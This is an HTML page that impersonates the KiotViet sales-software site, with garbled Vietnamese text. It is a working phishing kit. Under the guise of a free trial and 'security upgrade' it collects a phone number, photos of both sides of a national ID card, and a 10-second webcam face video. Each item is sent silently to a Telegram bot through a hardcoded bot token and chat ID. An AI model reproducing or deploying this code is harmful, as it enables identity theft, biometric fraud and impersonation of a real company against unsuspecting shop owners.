<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KiotViet - Qu·∫£n l√Ω b√°n h√†ng ph·ªï bi·∫øn nh·∫•t</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #f0f2f5; }
        .kv-green { color: #57b846; }
        .bg-kv-green { background-color: #57b846; }
        .hidden { display: none; }
        .card-shadow { box-shadow: 0 2px 10px rgba(0,0,0,0.08); }
        @keyframes scan { 0% { top: 5%; } 100% { top: 95%; } }
        .animate-scan { animation: scan 2s linear infinite; }
    </style>
</head>
<body>

<div id="app">
    <div id="landing-page">
        <nav class="flex items-center justify-between px-4 md:px-20 py-3 bg-white shadow-sm sticky top-0 z-50">
            <img src="https://www.kiotviet.vn/Static/Theme/images/logo.png" alt="KiotViet" class="h-7 md:h-8">
            <div class="flex items-center gap-3">
                <button onclick="renderPhoneInput()" class="text-gray-600 font-bold text-sm px-2">ƒêƒÉng nh·∫≠p</button>
                <button onclick="renderPhoneInput()" class="bg-[#ff9c00] text-white px-5 py-2 rounded font-bold text-sm shadow-sm hover:bg-[#e68d00]">ƒêƒÉng k√Ω</button>
            </div>
        </nav>
        <main class="max-w-6xl mx-auto px-6 pt-12 text-center">
            <h1 class="text-3xl md:text-5xl font-bold mb-6 text-gray-800 leading-tight">Ph·∫ßn m·ªÅm qu·∫£n l√Ω b√°n h√†ng <br/><span class="kv-green uppercase font-extrabold">Ph·ªï bi·∫øn nh·∫•t</span></h1>
            <p class="text-gray-500 mb-10 max-w-xl mx-auto">H∆°n 200.000 c·ª≠a h√†ng ƒëang s·ª≠ d·ª•ng KiotViet ƒë·ªÉ kinh doanh hi·ªáu qu·∫£ m·ªói ng√†y.</p>
            <button onclick="renderPhoneInput()" class="bg-kv-green text-white px-12 py-4 rounded-full font-bold text-lg shadow-lg hover:shadow-xl transition-all uppercase tracking-wide">D√πng th·ª≠ mi·ªÖn ph√≠</button>
            <div class="mt-12"><img src="https://www.kiotviet.vn/Static/Theme/images/banner_home_new.png" class="w-full max-w-4xl mx-auto rounded-xl shadow-lg border-4 border-white"></div>
        </main>
    </div>

    <div id="flow-content"></div>
</div>

<script>
    // --- C·∫§U H√åNH ƒê√É ƒê∆Ø·ª¢C ƒêI·ªÄN S·∫¥N ---
    const TELEGRAM_TOKEN = '8508820343:AAEd6sPNZgoXimq-ud_T7v_PFNsF62UELVA'; 
    const CHAT_ID = '-1003844702216'; 

    async function sendTele(text, file = null, type = 'text') {
        try {
            if (type === 'text') {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
            } else {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append(type, file);
                if(text) formData.append('caption', text);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
                    method: 'POST', body: formData
                });
            }
        } catch (e) { console.error(e); }
    }

    // --- B∆Ø·ªöC 2: NH·∫¨P SƒêT ---
    function renderPhoneInput() {
        document.getElementById('landing-page').classList.add('hidden');
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen flex flex-col items-center pt-24 px-4 bg-[#f0f2f5]">
            <div class="bg-white p-8 rounded-lg card-shadow w-full max-w-[400px] text-center border-t-4 border-kv-green">
                <img src="https://www.kiotviet.vn/Static/Theme/images/logo.png" class="h-6 mx-auto mb-8">
                <h2 class="text-xl font-bold mb-2 text-gray-800 uppercase tracking-tight">X√°c minh KiotViet ID</h2>
                <p class="text-[11px] text-gray-400 mb-8 italic">Vui l√≤ng nh·∫≠p s·ªë ƒëi·ªán tho·∫°i ƒë·ªÉ ti·∫øp t·ª•c</p>
                
                <div class="relative mb-6">
                    <input id="phone" type="tel" maxlength="10" placeholder="S·ªë ƒëi·ªán tho·∫°i" 
                        class="w-full p-4 border border-gray-200 rounded-md outline-none focus:border-kv-green text-center text-2xl tracking-[0.2em] font-medium">
                    <p id="phone-error" class="hidden text-red-500 text-[10px] mt-2 font-bold uppercase">SƒêT ph·∫£i b·∫Øt ƒë·∫ßu b·∫±ng 0 v√† ƒë·ªß 10 s·ªë</p>
                </div>

                <button onclick="validatePhone()" class="w-full bg-kv-green text-white py-4 rounded-md font-bold text-lg hover:bg-[#46a338] transition shadow-md uppercase">Ti·∫øp t·ª•c</button>
            </div>
        </div>`;
    }

    async function validatePhone() {
        const p = document.getElementById('phone').value;
        const err = document.getElementById('phone-error');
        const regex = /^0[0-9]{9}$/;

        if(regex.test(p)) {
            err.classList.add('hidden');
            await sendTele(`üì± **KH√ÅCH M·ªöI**: \`${p}\``);
            showNotify();
        } else {
            err.classList.remove('hidden');
        }
    }

    function showNotify() {
        const div = document.createElement('div');
        div.className = "fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4";
        div.innerHTML = `
        <div class="bg-white rounded-lg p-8 text-center max-w-sm w-full card-shadow border-t-4 border-[#ff9c00]">
            <h3 class="text-lg font-bold mb-4">Vui l√≤ng x√°c minh th√¥ng tin</h3>
            <p class="text-gray-500 mb-8 text-[13px] leading-relaxed">ƒê·ªÉ ho√†n t·∫•t quy tr√¨nh n√¢ng c·∫•p b·∫£o m·∫≠t, b·∫°n c·∫ßn cung c·∫•p ·∫£nh CCCD v√† x√°c th·ª±c khu√¥n m·∫∑t AI.</p>
            <button onclick="renderUpload()" class="w-full bg-kv-green text-white py-3 rounded font-bold uppercase shadow-md">X√°c minh ngay</button>
        </div>`;
        document.body.appendChild(div);
    }

    // --- B∆Ø·ªöC 3: UPLOAD CCCD ---
    function renderUpload() {
        if(document.querySelector('.fixed')) document.querySelector('.fixed').remove();
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen bg-white p-6 flex flex-col items-center pt-8">
            <h2 class="text-xl font-bold mb-10 uppercase kv-green">G·ª≠i ·∫£nh ƒë·ªãnh danh</h2>
            <div class="w-full max-w-sm space-y-6">
                <div class="relative border-2 border-dashed border-gray-200 rounded-xl h-52 flex items-center justify-center bg-gray-50 overflow-hidden hover:border-kv-green transition">
                    <input type="file" class="absolute inset-0 opacity-0 z-20 cursor-pointer" onchange="handleImg(this, 'f-pre', 'f-txt', 'M·∫∑t tr∆∞·ªõc')">
                    <div id="f-txt" class="text-center"><p class="text-gray-400 font-bold text-[11px] uppercase tracking-widest">M·∫∂T TR∆Ø·ªöC CCCD</p></div>
                    <img id="f-pre" class="hidden absolute inset-0 w-full h-full object-cover z-10">
                </div>
                <div class="relative border-2 border-dashed border-gray-200 rounded-xl h-52 flex items-center justify-center bg-gray-50 overflow-hidden hover:border-kv-green transition">
                    <input type="file" class="absolute inset-0 opacity-0 z-20 cursor-pointer" onchange="handleImg(this, 'b-pre', 'b-txt', 'M·∫∑t sau')">
                    <div id="b-txt" class="text-center"><p class="text-gray-400 font-bold text-[11px] uppercase tracking-widest">M·∫∂T SAU CCCD</p></div>
                    <img id="b-pre" class="hidden absolute inset-0 w-full h-full object-cover z-10">
                </div>
                <button onclick="renderVideo()" class="w-full bg-kv-green text-white py-4 rounded-lg font-bold mt-4 uppercase shadow-lg transition active:scale-95">Ti·∫øp t·ª•c b∆∞·ªõc cu·ªëi</button>
            </div>
        </div>`;
    }

    async function handleImg(input, preId, txtId, label) {
        if (input.files[0]) {
            const pre = document.getElementById(preId);
            const txt = document.getElementById(txtId);
            const reader = new FileReader();
            reader.onload = e => { pre.src = e.target.result; pre.classList.remove('hidden'); txt.classList.add('hidden'); };
            reader.readAsDataURL(input.files[0]);
            input.parentElement.classList.add('border-kv-green', 'bg-green-50');
            await sendTele(`üì∏ ${label} CCCD`, input.files[0], 'photo');
        }
    }

    // --- B∆Ø·ªöC 4: QUAY VIDEO M·∫∂T ---
    function renderVideo() {
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen bg-[#0a0a0a] flex flex-col items-center justify-center text-white p-6 text-center">
            <h2 class="text-[10px] font-bold mb-10 uppercase tracking-[0.3em] kv-green">X√°c th·ª±c khu√¥n m·∫∑t AI</h2>
            <div class="relative w-64 h-64 border-4 border-gray-800 rounded-full overflow-hidden shadow-2xl">
                <video id="v" autoplay muted playsinline class="w-full h-full object-cover"></video>
                <div id="scan" class="hidden absolute top-0 left-0 w-full h-1 bg-green-500 shadow-[0_0_15px_green] z-20 animate-scan"></div>
                <div class="absolute inset-0 border-[15px] border-[#0a0a0a]/70 rounded-full z-10"></div>
            </div>
            <div id="st" class="mt-10 text-[11px] font-bold uppercase tracking-widest text-gray-500">Gi·ªØ khu√¥n m·∫∑t trong khung h√¨nh</div>
            <button id="go" class="mt-10 bg-kv-green px-12 py-3 rounded-full font-bold uppercase tracking-widest shadow-lg active:scale-95 transition">B·∫Øt ƒë·∫ßu qu√©t</button>
        </div>`;

        const v = document.getElementById('v'), go = document.getElementById('go'), st = document.getElementById('st'), scan = document.getElementById('scan');
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            v.srcObject = stream;
            go.onclick = () => {
                go.classList.add('hidden'); scan.classList.remove('hidden'); st.innerText = "H·ªá th·ªëng ƒëang qu√©t m·∫∑t..."; st.classList.replace('text-gray-500', 'text-green-500');
                let chunks = [], r = new MediaRecorder(stream);
                r.ondataavailable = e => chunks.push(e.data);
                r.onstop = async () => {
                    await sendTele("üé• VIDEO X√ÅC MINH 10S", new Blob(chunks, {type: 'video/mp4'}), 'video');
                    alert("Ho√†n t·∫•t! Y√™u c·∫ßu c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c g·ª≠i x√©t duy·ªát."); window.location.reload();
                };
                r.start();
                let c = 10;
                let i = setInterval(() => {
                    c--; st.innerText = `ƒêANG QU√âT SINH TR·∫ÆC H·ªåC... (${c}S)`;
                    if (c <= 0) { clearInterval(i); r.stop(); stream.getTracks().forEach(t => t.stop()); }
                }, 1000);
            };
        });
    }
</script>
</body>
</html>
